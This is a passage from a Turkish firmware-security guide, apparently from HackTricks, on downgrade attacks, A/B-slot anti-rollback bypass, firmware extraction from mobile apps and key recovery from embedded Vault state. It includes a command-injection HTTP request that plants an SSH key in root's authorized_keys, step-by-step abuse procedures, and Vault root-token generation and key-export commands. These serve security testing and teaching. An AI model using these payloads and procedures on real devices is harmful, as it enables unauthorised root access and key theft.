   * Birçok tüketici IoT cihazı, Base64 ile kodlanmış firmware blob'larını kabul eden, bunları sunucu tarafında çözüp recovery/upgrade işlemini başlatan *kimlik doğrulamasız* HTTP(S) endpoint'leri sunar.
3. Downgrade sonrasında, daha yeni sürümde yamalanmış bir zafiyeti istismar edin (örneğin sonradan eklenen bir command-injection filtresi).
4. İsteğe bağlı olarak kalıcılık sağlandıktan sonra tespit edilmemek için en güncel imajı yeniden yükleyin veya güncellemeleri devre dışı bırakın.

### Örnek: Downgrade Sonrası Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Savunmasız (sürümü düşürülmüş) firmware'de `md5` parametresi, herhangi bir temizleme işleminden geçirilmeden doğrudan bir shell komutuna eklenir; bu da keyfi komutların enjekte edilmesine olanak tanır (burada SSH anahtarıyla root erişimini etkinleştirmek için). Daha sonraki firmware sürümlerinde temel bir karakter filtresi eklendi, ancak downgrade korumasının olmaması düzeltmeyi etkisiz kılar.<sup>[[4]](#references)</sup>

### Mobil Uygulamalardan Firmware Çıkarma

Birçok üretici, uygulamanın cihazı Bluetooth/Wi-Fi üzerinden güncelleyebilmesi için tam firmware imajlarını yardımcı mobil uygulamalarına ekler. Bu paketler genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi yollarda şifrelenmeden saklanır. `apktool`, `ghidra` gibi araçlar, hatta düz `unzip` bile fiziksel donanıma dokunmadan imzalı imajları çıkarmanızı sağlar.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot tasarımlarında yalnızca updater tarafındaki anti-rollback korumasını aşma

Bazı vendor'lar anti-downgrade **ratchet** uygular, ancak bunu yalnızca *updater* mantığında kullanır (örneğin CAN üzerinden bir UDS rutini, bir recovery komutu veya userspace OTA agent). **Bootloader** daha sonra yalnızca image imzasını/CRC'yi kontrol edip partition table'a veya slot metadata'sına güveniyorsa rollback koruması yine de aşılabilir.<sup>[[7]](#references)</sup>

Yaygın zayıf tasarım:

- Firmware metadata'sı hem bir version descriptor hem de bir **security ratchet** / monotonic counter içerir.
- Updater, image ratchet değerini persistent storage'da tutulan bir değerle karşılaştırır ve daha eski imzalı image'ları reddeder.
- Bootloader bu ratchet'i **parse etmez**; yalnızca seçilen slotu boot etmeden önce header'ı, CRC'yi ve imzayı doğrular.
- Slot etkinleştirme bilgisi ayrı olarak bir partition table'da veya slot başına tutulan generation counter'da saklanır ve doğrulanan firmware'in tam digest'ine kriptografik olarak **bağlı değildir**.

Bu durum, dual-slot sistemlerde **bir image'ı doğrula / başka bir image'ı boot et** primitive'ini oluşturur. Saldırgan, updater'a geçerli bir imzalı image kullanarak slot B'yi sonraki boot hedefi olarak işaretletebilir ve daha sonra reboot etmeden slot B'nin üzerine yazabilirse, bootloader yalnızca önceden commit edilmiş slot metadata'sına güvendiği için eski image'ı yine de boot edebilir.

Yaygın kötüye kullanım adımları:

1. Pasif slota **güncel ve imzalı** bir firmware yükleyin ve düzenin bu slotu sonraki etkin slot olarak işaretlemesi için normal validation/switch rutinini çalıştırın.
2. **Henüz reboot etmeyin**. Aynı oturumda slot hazırlama/silme rutinine yeniden girin.
3. Updater'ın az önce etkinleştirilen **aynı fiziksel slotu** silmesi için eski boot-state veya slot seçimi mantığını kötüye kullanın.
4. Bu slota **daha eski ancak hâlâ imzalı** bir firmware yazın.
5. Ratchet'i uygulayan validation rutinini atlayın ve doğrudan reboot edin.
6. Bootloader etkinleştirilmiş slotu seçer, yalnızca imzayı/bütünlüğü doğrular ve eski image'ı boot eder.

A/B update uygulamalarını reverse ederken dikkat edilmesi gerekenler:

- Slot seçiminin, başarılı bir switch işleminden sonra yenilenmeyen **boot-time flag'lerden** türetilmesi.
- **Mevcut commit edilmiş düzen** yerine eski state'e göre slot silen `prepare_passive_slot()` benzeri bir rutin.
- Doğrulanmış image hash'ini kaydetmeyip yalnızca **generation counter** / active flag değerini artıran `part_write_layout()` benzeri bir fonksiyon.
- Ratchet kontrollerinin userspace veya updater kodunda uygulanıp ROM / bootloader / secure boot aşamalarında **uygulanmaması**.
- İçeriği silinip yeniden yazıldıktan sonra bile slotu boot edilebilir olarak işaretli bırakan silme veya recovery rutinleri.

### Update Mantığını Değerlendirme Kontrol Listesi

* *Update endpoint*'in transport/authentication güvenliği yeterince sağlanmış mı (TLS + authentication)?
* Cihaz, flash işleminden önce **version number** veya **monotonic anti-rollback counter** değerlerini karşılaştırıyor mu?
* Image, secure boot chain içinde doğrulanıyor mu (ör. imzalar ROM kodu tarafından kontrol ediliyor mu)?
* **Bootloader**, yalnızca imza/CRC kontrolü yapmak yerine updater ile aynı ratchet'i uyguluyor mu?
* Slot etkinleştirme metadata'sı **doğrulanmış firmware digest/version değerine bağlı mı**, yoksa slot etkinleştirildikten sonra değiştirilebilir mi?
* Slot switch başarılı olduktan sonra cihaz zorunlu olarak reboot ediliyor mu, yoksa aynı oturumda daha sonraki update/silme rutinlerine hâlâ erişilebiliyor mu?
* Userland kodu ek sanity check'ler yapıyor mu (ör. izin verilen partition map, model number)?
* *Partial* veya *backup* update akışları aynı validation mantığını yeniden kullanıyor mu?

> 💡  Yukarıdakilerden herhangi biri eksikse platform muhtemelen rollback saldırılarına karşı savunmasızdır.

## Pratik yapmak için savunmasız firmware'ler

Firmware'deki güvenlik açıklarını keşfetme pratiği yapmak için başlangıç noktası olarak aşağıdaki savunmasız firmware projelerini kullanın.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Gömülü KMS/Vault state içinden firmware şifre çözme anahtarlarını kurtarma

Bir update image'ı küçük plaintext metadata'yı büyük, yüksek entropili bir blob ile birleştiriyorsa herhangi bir şeyi brute-force etmeden önce container triage yapın:<sup>[[1]](#references)</sup>

- Header'ları, offset'leri ve satır sınırlarını `hexdump`, `xxd`, `strings -tx`, `base64 -d` ve `binwalk -E` ile dökümleyin.
- `Salted__` genellikle OpenSSL `enc` formatını belirtir: sonraki 8 byte salt, kalan byte'lar ise ciphertext'tir.
- Tam olarak `256` byte'a decode edilen bir Base64 alanı, rastgele bir firmware password/session key'i sarmalayan RSA-2048 ciphertext'ine işaret eden güçlü bir ipucudur.
- Aynı dosyadaki detached PGP içeriği çoğu zaman yalnızca authenticity'yi korur; bunun confidentiality mekanizması olduğunu varsaymayın.

Statik anahtar arama (`grep`, `strings`, PEM/PGP aramaları) sonuç vermezse yalnızca private key aramak yerine **operational decrypt path**'i reverse edin:

- Updater / management binary'sini decompile edin ve şifrelenmiş blob'u kimin okuduğunu, hangi helper/API'nin onu çözdüğünü ve hangi mantıksal key name'in istendiğini izleyin.
- KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) ile unit file'ları ve init script'lerini çıkartılmış root filesystem'de arayın.
- Plaintext `vault operator unseal ...` komutlarını, recovery key'leri, bootstrap token'larını veya yerel KMS auto-unseal script'lerini private-key materyaliyle eşdeğer kabul edin.

Appliance orijinal Vault binary'sini ve storage backend'ini içeriyorsa bu ortamı yeniden oluşturmak genellikle Vault internals'ını baştan uygulamaktan daha kolaydır:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Klonlanmış KMS üzerinde root erişimiyle:

- Transit key'leri yalnızca izole klonda export edilebilir yapın: `vault write transit/keys/<name>/config exportable=true`
- Unwrap key'i export edin: `vault read transit/export/encryption-key/<name>`
- Kurtarılan RSA key'i, KMS'in kullandığı tam padding/hash çiftiyle deneyin. PKCS#1 v1.5 decrypt işleminin ve varsayılan OAEP decrypt işleminin başarısız olması, key'in yanlış olduğunu **kanıtlamaz**; Vault destekli birçok akış SHA-256 ile OAEP kullanırken yaygın kütüphaneler varsayılan olarak SHA-1 kullanır.
- Payload `Salted__` ile başlıyorsa, AES-CBC decrypt işlemine geçmeden önce üreticinin OpenSSL KDF'sini (`EVP_BytesToKey`, eski cihazlarda genellikle MD5) tam olarak yeniden uygulayın.

Bu, "şifrelenmiş firmware" sorununu daha genel bir probleme dönüştürür: **cihaz tarafındaki operasyonel key'leri kurtarın, ardından unwrap + KDF parametrelerini çevrimdışı olarak tam biçimde yeniden uygulayın**.

## Eğitim ve Sertifikalar

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude ile Firmware Cracking: Kıdemli Düzeyde Yetkinlik, Başlangıç Düzeyinde Özerklik](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Güvenliği Test Metodolojisi](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Pratik IoT Hacking: Nesnelerin İnterneti'ne Saldırmak İçin Kesin Rehber](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Terk Edilmiş Donanımda Zero-Day Açıklarını Exploit Etmek – Trail of Bits blogu](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20 Dolarlık Bir Akıllı Cihaz Bana Evinize Erişim Sağladı](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Şimdi mi Gördün: Şimdi Pwned Oldun](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector'ı şarj portu konektöründen Exploit Etmek - Bölüm 2: Anti-downgrade'i Atlatmak](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Yanıp Sönmesini Sağlamak: Philips Hue Bridge'in Over-the-Air Exploitation'ı](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU'da Tesla OS'a ROOT Erişimi, Bölüm 2: Debugging ve Düzeltme](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
{{#include ../../banners/hacktricks-training.md}}
